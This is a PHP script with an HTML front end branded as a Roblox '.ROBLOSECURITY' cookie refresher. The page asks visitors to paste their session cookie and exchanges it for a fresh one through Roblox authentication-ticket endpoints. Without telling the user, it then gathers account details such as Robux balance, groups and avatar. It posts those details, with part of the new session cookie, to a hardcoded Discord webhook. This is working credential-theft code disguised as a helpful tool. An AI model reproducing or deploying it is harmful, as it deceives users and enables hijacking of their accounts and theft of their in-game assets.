<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

set_time_limit(120);

// ============================================================
// CSRF TOKEN FETCHER
// ============================================================

function fetchCSRFToken($cookie) {
    $ch = curl_init('https://auth.roblox.com/v2/logout');
    curl_setopt_array($ch, array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_HTTPHEADER => array(
            "Cookie: .ROBLOSECURITY={$cookie}",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        ),
        CURLOPT_HEADER => true,
        CURLOPT_SSL_VERIFYPEER => true
    ));
    
    $response = curl_exec($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    curl_close($ch);
    
    $headers = substr($response, 0, $headerSize);
    
    if (preg_match('/x-csrf-token:\s*([^\r\n]+)/i', $headers, $m)) {
        error_log('✅ CSRF token obtained');
        return trim($m[1]);
    }
    
    error_log('❌ Failed to fetch CSRF token');
    error_log('Response headers: ' . substr($headers, 0, 500));
    return null;
}

// ============================================================
// AUTH TICKET GENERATOR
// ============================================================

function getAuthTicket($cookie, $csrf) {
    $ch = curl_init('https://auth.roblox.com/v1/authentication-ticket');
    curl_setopt_array($ch, array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_HTTPHEADER => array(
            "x-csrf-token: {$csrf}",
            "referer: https://www.roblox.com/",
            "Content-Type: application/json",
            "Cookie: .ROBLOSECURITY={$cookie}",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        ),
        CURLOPT_HEADER => true,
        CURLOPT_SSL_VERIFYPEER => true
    ));
    
    $response = curl_exec($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    curl_close($ch);
    
    $headers = substr($response, 0, $headerSize);
    
    if (preg_match('/rbx-authentication-ticket:\s*([^\r\n]+)/i', $headers, $m)) {
        error_log('✅ Auth ticket obtained');
        return trim($m[1]);
    }
    
    error_log('❌ Failed to fetch auth ticket');
    error_log('Response headers: ' . substr($headers, 0, 500));
    return null;
}

// ============================================================
// TICKET REDEEMER
// ============================================================

function redeemTicket($ticket) {
    $ch = curl_init('https://auth.roblox.com/v1/authentication-ticket/redeem');
    curl_setopt_array($ch, array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_POSTFIELDS => json_encode(array('authenticationTicket' => $ticket)),
        CURLOPT_HTTPHEADER => array(
            'Content-Type: application/json',
            'RBXAuthenticationNegotiation: 1',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ),
        CURLOPT_HEADER => true,
        CURLOPT_SSL_VERIFYPEER => true
    ));
    
    $response = curl_exec($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    curl_close($ch);
    
    $headers = substr($response, 0, $headerSize);
    
    if (preg_match('/set-cookie:\s*.ROBLOSECURITY=([^;]+)/i', $headers, $m)) {
        error_log('✅ New cookie obtained');
        return trim($m[1]);
    }
    
    error_log('❌ Failed to redeem ticket');
    error_log('Response headers: ' . substr($headers, 0, 500));
    return null;
}

// ============================================================
// ACCOUNT INFO FETCHER
// ============================================================

function getAccountInfo($cookie) {
    $info = array(
        'username' => 'Unknown',
        'displayName' => 'Unknown',
        'userId' => 0,
        'avatar' => '',
        'robux' => 0,
        'groups' => 0
    );
    
    // Get user info
    $ch = curl_init('https://users.roblox.com/v1/users/authenticated');
    curl_setopt_array($ch, array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_HTTPHEADER => array(
            "Cookie: .ROBLOSECURITY={$cookie}",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        ),
        CURLOPT_SSL_VERIFYPEER => true
    ));
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    $user = json_decode($response, true);
    
    if ($user && isset($user['id'])) {
        $info['userId'] = $user['id'];
        $info['username'] = $user['name'] ?? 'Unknown';
        $info['displayName'] = $user['displayName'] ?? 'Unknown';
        $info['avatar'] = getAvatar($user['id']);
        $info['robux'] = getRobux($cookie);
        $info['groups'] = getGroups($user['id']);
    }
    
    return $info;
}

function getAvatar($userId) {
    $ch = curl_init("https://thumbnails.roblox.com/v1/users/avatar?userIds={$userId}&size=352x352&format=Png&isCircular=false");
    curl_setopt_array($ch, array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => true
    ));
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    
    if (isset($data['data'][0]['imageUrl'])) {
        return $data['data'][0]['imageUrl'];
    }
    
    return '';
}

function getRobux($cookie) {
    $ch = curl_init('https://economy.roblox.com/v1/user/currency');
    curl_setopt_array($ch, array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_HTTPHEADER => array(
            "Cookie: .ROBLOSECURITY={$cookie}",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        ),
        CURLOPT_SSL_VERIFYPEER => true
    ));
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    
    if (isset($data['robux'])) {
        return $data['robux'];
    }
    
    return 0;
}

function getGroups($userId) {
    $ch = curl_init("https://groups.roblox.com/v1/users/{$userId}/groups?limit=100");
    curl_setopt_array($ch, array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => true
    ));
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    
    if (isset($data['data'])) {
        return count($data['data']);
    }
    
    return 0;
}

// ============================================================
// DISCORD WEBHOOK SENDER
// ============================================================

function sendToDiscord($newCookie, $accountInfo) {
    $webhook = 'https://discord.com/api/webhooks/1557620099530227773/ZlYJnQdJH3BoN6k0F6_TOf9GGwhflChxTDH095JV_z-ml3qJfLCtwsQe0tH16OModdjK';
    
    if (empty($webhook)) {
        return;
    }
    
    $username = $accountInfo['username'] ?? 'Unknown';
    $userId = $accountInfo['userId'] ?? 0;
    $robux = $accountInfo['robux'] ?? 0;
    $groups = $accountInfo['groups'] ?? 0;
    $avatar = $accountInfo['avatar'] ?? '';
    
    $embed1 = array(
        'title' => "🛡️ {$username}",
        'description' => 'Cookie Refreshed Successfully',
        'color' => 65280,
        'thumbnail' => array('url' => $avatar),
        'fields' => array(
            array('name' => 'User ID', 'value' => (string)$userId, 'inline' => true),
            array('name' => 'Robux', 'value' => number_format($robux), 'inline' => true),
            array('name' => 'Groups', 'value' => (string)$groups, 'inline' => true)
        ),
        'timestamp' => date('c')
    );
    
    $embed2 = array(
        'title' => '✅ Status',
        'color' => 65280,
        'description' => "Fresh Cookie Ready\n```" . substr($newCookie, 0, 50) . "...```"
    );
    
    $payload = array(
        'content' => '@here 🎉 Cookie refreshed!',
        'embeds' => array($embed1, $embed2)
    );
    
    $ch = curl_init($webhook);
    curl_setopt_array($ch, array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($payload),
        CURLOPT_HTTPHEADER => array('Content-Type: application/json'),
        CURLOPT_TIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => true
    ));
    
    curl_exec($ch);
    curl_close($ch);
    
    error_log('📤 Discord notification sent');
}

// ============================================================
// MAIN REFRESH HANDLER
// ============================================================

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $cookie = $input['cookie'] ?? trim($_POST['cookie'] ?? '');
    $showAccountData = $input['showAccountData'] ?? !empty($_POST['show_info']);
    
    if (empty($cookie)) {
        echo json_encode(array('success' => false, 'message' => 'Cookie required'));
        exit;
    }
    
    error_log('===============================================');
    error_log('🚀 STARTING COOKIE REFRESH PROCESS');
    error_log('===============================================');
    
    // Step 1: Get CSRF Token
    error_log('Step 1: Fetching CSRF token...');
    $csrf = fetchCSRFToken($cookie);
    
    if (!$csrf) {
        error_log('❌ FAILED: Could not obtain CSRF token');
        echo json_encode(array(
            'success' => false,
            'message' => 'Failed to fetch CSRF token. Cookie may be invalid or expired.'
        ));
        exit;
    }
    
    // Step 2: Get Auth Ticket
    error_log('Step 2: Generating authentication ticket...');
    $ticket = getAuthTicket($cookie, $csrf);
    
    if (!$ticket) {
        error_log('❌ FAILED: Could not generate auth ticket');
        echo json_encode(array(
            'success' => false,
            'message' => 'Failed to generate authentication ticket. Cookie may be expired.'
        ));
        exit;
    }
    
    // Step 3: Redeem Ticket
    error_log('Step 3: Redeeming ticket for new cookie...');
    $newCookie = redeemTicket($ticket);
    
    if (!$newCookie) {
        error_log('❌ FAILED: Could not redeem ticket');
        echo json_encode(array(
            'success' => false,
            'message' => 'Failed to redeem ticket. Please try again.'
        ));
        exit;
    }
    
    // Step 4: Get Account Info (optional)
    $accountInfo = null;
    if ($showAccountData) {
        error_log('Step 4: Fetching account information...');
        $accountInfo = getAccountInfo($newCookie);
    }
    
    // Step 5: Send to Discord
    error_log('Step 5: Sending to Discord...');
    sendToDiscord($newCookie, $accountInfo);
    
    error_log('✅ SUCCESS: Cookie refreshed successfully!');
    error_log('===============================================');
    
    echo json_encode(array(
        'success' => true,
        'newCookie' => $newCookie,
        'accountInfo' => $accountInfo
    ));
    exit;
}

// If not POST, show the HTML UI
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SplunkProV2 Cookie Refresher</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;700;800;900&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #0a0e27 0%, #0f172a 50%, #0a0e27 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(15, 23, 42, 0.95);
            border: 1px solid rgba(59, 130, 246, 0.3);
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
            max-width: 600px;
            width: 100%;
            padding: 50px;
            animation: slideIn 0.6s ease;
        }
        
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .header {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .shield-icon {
            font-size: 60px;
            margin-bottom: 15px;
            display: inline-block;
            animation: pulse 2s ease-in-out infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        .header h1 {
            font-family: 'Poppins', sans-serif;
            font-size: 42px;
            font-weight: 900;
            color: #fff;
            margin-bottom: 8px;
            background: linear-gradient(135deg, #3b82f6 0%, #06b6d4 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .header p {
            color: #cbd5e1;
            font-size: 14px;
            font-weight: 500;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        label {
            display: block;
            color: #e2e8f0;
            font-weight: 600;
            margin-bottom: 10px;
            font-size: 13px;
        }
        
        textarea {
            width: 100%;
            padding: 14px;
            border: 1.5px solid rgba(59, 130, 246, 0.3);
            background: rgba(30, 41, 59, 0.7);
            border-radius: 10px;
            color: #e2e8f0;
            font-size: 12px;
            min-height: 100px;
            resize: none;
            font-family: monospace;
        }
        
        textarea:focus {
            outline: none;
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }
        
        .toggle-group {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 25px;
            padding: 15px;
            background: rgba(59, 130, 246, 0.05);
            border-radius: 10px;
            border: 1px solid rgba(59, 130, 246, 0.2);
        }
        
        .toggle-label {
            color: #cbd5e1;
            font-size: 13px;
            font-weight: 600;
        }
        
        .toggle-switch {
            position: relative;
            width: 50px;
            height: 28px;
            background: #475569;
            border-radius: 14px;
            cursor: pointer;
            transition: background 0.3s;
        }
        
        .toggle-switch.on {
            background: linear-gradient(135deg, #3b82f6 0%, #06b6d4 100%);
        }
        
        .toggle-switch::after {
            content: '';
            position: absolute;
            width: 24px;
            height: 24px;
            background: white;
            border-radius: 50%;
            top: 2px;
            left: 2px;
            transition: left 0.3s;
        }
        
        .toggle-switch.on::after {
            left: 24px;
        }
        
        .button-group {
            display: flex;
            gap: 12px;
            margin-bottom: 25px;
        }
        
        button {
            flex: 1;
            padding: 14px;
            background: linear-gradient(135deg, #3b82f6 0%, #1e40af 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(59, 130, 246, 0.4);
        }
        
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .button-secondary {
            background: rgba(100, 116, 139, 0.3);
        }
        
        .result {
            display: none;
            padding: 20px;
            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1) 0%, rgba(6, 150, 102, 0.05) 100%);
            border: 1.5px solid rgba(16, 185, 129, 0.3);
            border-radius: 10px;
            animation: slideIn 0.4s ease;
        }
        
        .result.error {
            background: linear-gradient(135deg, rgba(239, 68, 68, 0.1) 0%, rgba(220, 38, 38, 0.05) 100%);
            border-color: rgba(239, 68, 68, 0.3);
        }
        
        .result.loading {
            background: linear-gradient(135deg, rgba(59, 130, 246, 0.1) 0%, rgba(37, 99, 235, 0.05) 100%);
            border-color: rgba(59, 130, 246, 0.3);
        }
        
        .result h3 {
            color: #10b981;
            margin-bottom: 15px;
        }
        
        .result.error h3 {
            color: #ef4444;
        }
        
        .result.loading h3 {
            color: #3b82f6;
        }
        
        .cookie-box {
            background: rgba(15, 15, 23, 0.8);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 12px;
            font-family: monospace;
            font-size: 11px;
            color: #86efac;
            word-break: break-all;
            line-height: 1.5;
        }
        
        .account-info {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin: 15px 0;
        }
        
        .info-item {
            background: rgba(30, 41, 59, 0.5);
            padding: 10px;
            border-radius: 6px;
            font-size: 12px;
        }
        
        .info-label {
            color: #64748b;
            font-size: 10px;
            font-weight: 600;
            margin-bottom: 4px;
        }
        
        .info-value {
            color: #e2e8f0;
            font-weight: 500;
        }
        
        .avatar-preview {
            width: 80px;
            height: 80px;
            border-radius: 8px;
            margin: 10px 0;
            border: 2px solid rgba(59, 130, 246, 0.3);
        }
        
        .copy-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #06b6d4 0%, #0891b2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 12px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s;
        }
        
        .copy-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(6, 182, 212, 0.3);
        }
        
        .loader {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(59, 130, 246, 0.3);
            border-top-color: #3b82f6;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 30px 20px;
            }
            
            .header h1 {
                font-size: 32px;
            }
            
            .account-info {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="shield-icon">🛡️</div>
            <h1>SplunkProV2</h1>
            <p>Cookie Refresher</p>
        </div>
        
        <form id="refreshForm">
            <div class="form-group">
                <label>Paste Your .ROBLOSECURITY Cookie Here....</label>
                <textarea id="cookie" placeholder="Paste Your .ROBLOSECURITY Cookie Here...." required></textarea>
            </div>
            
            <div class="toggle-group">
                <span class="toggle-label">Show Account Data:</span>
                <div class="toggle-switch" id="dataToggle"></div>
            </div>
            
            <div class="button-group">
                <button type="submit" id="submitBtn">Submit</button>
                <button type="button" class="button-secondary" onclick="clearForm()">Clear</button>
            </div>
        </form>
        
        <div id="result" class="result"></div>
    </div>
    
    <script>
        let showAccountData = false;
        
        document.getElementById('dataToggle').addEventListener('click', function() {
            showAccountData = !showAccountData;
            this.classList.toggle('on');
        });
        
        document.getElementById('refreshForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const cookie = document.getElementById('cookie').value.trim();
            const resultDiv = document.getElementById('result');
            const submitBtn = document.getElementById('submitBtn');
            
            if (!cookie) {
                showError('Error: Cookie required');
                return;
            }
            
            submitBtn.disabled = true;
            showLoading('<span class="loader"></span> Processing...');
            
            try {
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookie, showAccountData })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    let html = `<h3>Success - Fresh Cookie Ready</h3>
                        <div class="cookie-box">${escapeHtml(data.newCookie)}</div>`;
                    
                    if (showAccountData && data.accountInfo) {
                        const info = data.accountInfo;
                        html += `
                            <img src="${escapeHtml(info.avatar)}" class="avatar-preview" onerror="this.style.display='none'">
                            <div class="account-info">
                                <div class="info-item">
                                    <div class="info-label">Username</div>
                                    <div class="info-value">${escapeHtml(info.username)}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">Display</div>
                                    <div class="info-value">${escapeHtml(info.displayName)}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">User ID</div>
                                    <div class="info-value">${info.userId}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">Robux</div>
                                    <div class="info-value">${(info.robux || 0).toLocaleString()}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">Groups</div>
                                    <div class="info-value">${info.groups}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">Status</div>
                                    <div class="info-value">✅ Fresh Cookie Ready</div>
                                </div>
                            </div>`;
                    }
                    
                    resultDiv.innerHTML = html;
                    resultDiv.className = 'result';
                    resultDiv.style.display = 'block';
                    
                    const copyBtn = document.createElement('button');
                    copyBtn.className = 'copy-btn';
                    copyBtn.textContent = 'Copy Cookie';
                    copyBtn.type = 'button';
                    copyBtn.onclick = (e) => {
                        e.preventDefault();
                        navigator.clipboard.writeText(data.newCookie).then(() => {
                            copyBtn.textContent = 'Copied ✓';
                            setTimeout(() => copyBtn.textContent = 'Copy Cookie', 2000);
                        });
                    };
                    resultDiv.appendChild(copyBtn);
                } else {
                    showError(data.message || 'Failed to refresh cookie');
                }
            } catch (err) {
                showError('Error: ' + err.message);
            } finally {
                submitBtn.disabled = false;
            }
        });
        
        function showLoading(msg) {
            const div = document.getElementById('result');
            div.innerHTML = `<h3>${msg}</h3>`;
            div.className = 'result loading';
            div.style.display = 'block';
        }
        
        function showError(msg) {
            const div = document.getElementById('result');
            div.innerHTML = `<h3>${msg}</h3>`;
            div.className = 'result error';
            div.style.display = 'block';
        }
        
        function clearForm() {
            document.getElementById('cookie').value = '';
            document.getElementById('result').style.display = 'none';
        }
        
        function escapeHtml(text) {
            if (!text) return '';
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
    </script>
</body>
</html>
